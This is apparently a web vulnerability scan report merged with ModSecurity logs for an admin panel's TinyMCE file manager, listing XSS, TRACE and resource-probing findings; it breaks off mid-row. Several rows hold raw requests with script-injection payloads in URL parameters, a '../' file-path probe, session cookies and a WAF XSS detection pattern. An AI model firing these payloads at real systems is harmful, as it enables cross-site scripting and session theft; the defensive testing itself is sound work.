This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c07593</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(469199)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;5519719c07593=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=tbqm0tb7qi8aa8v1eb2ku8b535
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:17:24</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:17:23 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(469199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtqS6wQAW0AAB7zKE4AAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtqS6wQAW0AAB7zKE4AAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366675</td><td class=xl24 width=64 >2015-03-31 17:07:59</td><td class=xl24 width=64 >&lt;p&gt;The HTTP TRACE method is normally used to return the full HTTP request back to the requesting client for proxy-debugging purposes.  An attacker can create a webpage using XMLHTTP, ActiveX, or XMLDOM to cause a client to issue a TRACE request and capture the client&amp;#39;s cookies.  This effectively results in a Cross-Site Scripting attack.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79</td><td class=xl24 width=64 >TRACE</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >TRACE / HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
TraceEnable: yes
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >405</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366676</td><td class=xl24 width=64 >2015-03-31 17:07:59</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/.htaccess</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /.htaccess HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >403</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366677</td><td class=xl24 width=64 >2015-03-31 17:08:03</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/license.txt</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/license.txt HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366678</td><td class=xl24 width=64 >2015-03-31 17:08:04</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager_plugin/LICENSE.TXT</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager_plugin/LICENSE.TXT HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366679</td><td class=xl24 width=64 >2015-03-31 17:08:05</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager_plugin/changelog.txt</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager_plugin/changelog.txt HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366680</td><td class=xl24 width=64 >2015-03-31 17:08:05</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager_plugin/readme.txt</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager_plugin/readme.txt HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366681</td><td class=xl24 width=64 >2015-03-31 17:08:06</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager_plugin/source/source.txt</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager_plugin/source/source.txt HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366682</td><td class=xl24 width=64 >2015-03-31 17:08:06</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager_plugin/thumbs/thumbs.txt</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager_plugin/thumbs/thumbs.txt HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366685</td><td class=xl24 width=64 >2015-03-31 17:08:07</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager_plugin/filemanager/ajax_calls.php?get_file&amp;sub_preview&amp;preview_mode=text&amp;title=source&amp;file=../source/source.txt</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager_plugin/filemanager/ajax_calls.php?get_file&amp;sub_preview&amp;preview_mode=text&amp;title=source&amp;file=../source/source.txt HTTP/1.1
Cookie: PHPSESSID=oh17huvb3cab7jqh004fjbm6l2
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366686</td><td class=xl24 width=64 >2015-03-31 17:08:07</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/phpmyadmin/</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /phpmyadmin HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366687</td><td class=xl24 width=64 >2015-03-31 17:08:08</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/phpMyAdmin/</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /phpMyAdmin HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366688</td><td class=xl24 width=64 >2015-03-31 17:08:11</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/cgi-bin/</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /cgi-bin HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366690</td><td class=xl24 width=64 >2015-03-31 17:38:16</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/phpmyadmin</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /phpmyadmin HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366691</td><td class=xl24 width=64 >2015-03-31 17:38:17</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/phpMyAdmin</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET /phpMyAdmin HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >404</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366700</td><td class=xl24 width=64 >2015-03-31 17:53:13</td><td class=xl24 width=64 >&lt;p&gt;Rather than an actual vulnerability, this attack is informational, indicating that access to some resource is not granted. The resource is predictable and although it is not accessible via any URL links in the web application, probing using intelligent brute force methods or commonly used resource names indicates presence of the resource.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >GET / HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:25</td><td class=xl24 width=64 >200</td><td class=xl24 width=64 ></td><td class=xl24 width=64 >0</td><td class=xl24 width=64 ></td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366737</td><td class=xl24 width=64 >2015-03-31 18:23:36</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?demo=dswa</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >demo</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?demo=&lt;script&gt;prompt(582999)&lt;/script/&gt; HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: PHPSESSID=luitcn6jii6kikreg3fmmokq26
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:26</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:25 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:demo. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(582999)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsaawQAW0AAHhGMtQAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsaawQAW0AAHhGMtQAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366747</td><td class=xl24 width=64 >2015-03-31 18:31:08</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(806399)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=tekb20blo9ijeu4bcvcb5l4f86
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:26:27</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:26:26 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(806399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsaqwQAW0AAHzDqroAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsaqwQAW0AAHzDqroAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366748</td><td class=xl24 width=64 >2015-03-31 18:33:07</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type='&gt;&lt;script&gt;alert(275899)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
